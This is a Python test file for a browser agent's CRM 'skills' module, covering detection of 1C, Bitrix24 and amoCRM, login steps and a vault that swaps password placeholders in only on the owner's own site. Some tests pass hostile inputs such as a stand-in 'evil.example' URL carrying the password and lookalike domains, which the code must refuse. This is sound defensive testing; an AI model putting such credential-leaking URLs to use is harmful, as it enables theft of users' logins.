import base64
import json
from datetime import datetime, timezone

import pytest

from app.models import User
from app.skills import (
    SecretRefused,
    credential_for,
    detect,
    guide_for,
    login_steps,
    placeholder,
    resolve_secret_args,
)
from app.vault import store_credential

KEY = base64.b64encode(b"k" * 32).decode()
SECRET = "s3cret-for-tests"


def _user(session, email="skills@example.com") -> User:
    user = User(
        email=email,
        consent_pdn=True,
        consent_training=False,
        is_admin=False,
        created_at=datetime.now(timezone.utc),
    )
    session.add(user)
    session.flush()
    return user


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("Выставь счёт в 1С клиенту Ромашка", ["1c"]),
        ("создай сделку в битриксе", ["bitrix24"]),
        ("Поставь задачу в Б24 на завтра", ["bitrix24"]),
        ("перенеси лид в амо на этап КП", ["amocrm"]),
        ("Обнови контакт в amoCRM", ["amocrm"]),
        ("сверь сделки из Битрикс24 с оплатами в 1С", ["1c", "bitrix24"]),
    ],
)
def test_detect_by_request(text, expected) -> None:
    assert [book.id for book in detect(text)] == sorted(expected, key=["1c", "bitrix24", "amocrm"].index)


@pytest.mark.parametrize(
    "text",
    ["сделай самостоятельно отчёт", "найди 15 поставщиков", "напиши письмо клиенту", "amount 1500"],
)
def test_detect_ignores_lookalikes(text) -> None:
    assert detect(text) == []
    assert guide_for(text) is None


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://romashka.bitrix24.ru/crm/deal/kanban/", "bitrix24"),
        ("https://romashka.amocrm.ru/leads/pipeline/", "amocrm"),
        ("https://1cfresh.com/a/sbm/123/ru_RU/", "1c"),
        ("https://buh.romashka.local/base/ru_RU/#e1cib/list/Справочник.Контрагенты", "1c"),
        ("https://crm.romashka.ru/crm/deal/details/12/", "bitrix24"),
    ],
)
def test_detect_by_url(url, expected) -> None:
    assert [book.id for book in detect("", url)] == [expected]


def test_guide_has_navigation_and_safety_rules() -> None:
    guide = guide_for("проведи реализацию в 1с")
    assert guide is not None
    assert "#e1cib/list/" in guide
    assert "Опасно" in guide
    assert "<CREDENTIAL:" in guide
    bitrix = guide_for("", "https://x.bitrix24.ru/crm/deal/list/")
    assert "iframe" in bitrix


def test_login_steps_use_placeholder_only(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    row = store_credential(session, user, "romashka.bitrix24.ru", "ivan@romashka.ru", SECRET)
    steps = login_steps(session, user, "bitrix24")
    dumped = json.dumps(steps, ensure_ascii=False)
    assert SECRET not in dumped
    assert placeholder(row.id) in dumped
    assert steps[0] == {"tool": "browser_open", "args": {"url": "https://romashka.bitrix24.ru"}}
    tools = [step["tool"] for step in steps]
    # Битрикс24 спрашивает логин и пароль на разных экранах.
    assert tools.index("browser_click") < tools.index("browser_type", 3)
    assert login_steps(session, user, "amocrm") == []
    assert login_steps(session, user, "unknown") == []


def test_credential_for_matches_self_hosted_by_url(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    store_credential(session, user, "https://buh.romashka.ru/base", "Бухгалтер", SECRET)
    found = credential_for(session, user, "1c", "https://buh.romashka.ru/base/ru_RU/")
    assert found is not None and found["username"] == "Бухгалтер"
    assert "secret" not in found
    assert credential_for(session, user, "1c") is None


def test_secret_is_substituted_only_on_its_site(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    row = store_credential(session, user, "romashka.amocrm.ru", "ivan", SECRET)
    args = {"selector": "#password", "text": placeholder(row.id)}

    ok = resolve_secret_args(session, user, "browser_type", args, "https://romashka.amocrm.ru/")
    assert ok["text"] == SECRET
    assert args["text"] == placeholder(row.id)
    # Форма входа amoCRM на общем домене тоже годится.
    assert resolve_secret_args(session, user, "browser_type", args, "https://www.amocrm.ru/")["text"] == SECRET

    for url in ("https://evil.example/", "https://romashka.amocrm.ru.evil.example/", None):
        with pytest.raises(SecretRefused) as exc:
            resolve_secret_args(session, user, "browser_type", args, url)
        assert exc.value.code == "secret_wrong_site"


def test_secret_never_goes_into_urls_or_mixed_text(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    user = _user(session)
    row = store_credential(session, user, "romashka.bitrix24.ru", "ivan", SECRET)
    ph = placeholder(row.id)
    here = "https://romashka.bitrix24.ru/"
    with pytest.raises(SecretRefused) as exc:
        resolve_secret_args(session, user, "browser_open", {"url": f"https://evil.example/?p={ph}"}, here)
    assert exc.value.code == "secret_wrong_tool"
    with pytest.raises(SecretRefused) as exc:
        resolve_secret_args(session, user, "browser_type", {"text": f"пароль {ph}"}, here)
    assert exc.value.code == "secret_wrong_field"
    plain = {"text": "обычный текст"}
    assert resolve_secret_args(session, user, "browser_type", plain, here) is plain


def test_secret_of_another_user_is_refused(session, monkeypatch) -> None:
    monkeypatch.setenv("VAULT_MASTER_KEY", KEY)
    owner = _user(session, "owner@example.com")
    other = _user(session, "other@example.com")
    row = store_credential(session, owner, "romashka.bitrix24.ru", "ivan", SECRET)
    with pytest.raises(SecretRefused) as exc:
        resolve_secret_args(
            session, other, "browser_type", {"text": placeholder(row.id)}, "https://romashka.bitrix24.ru/"
        )
    assert exc.value.code == "secret_not_found"
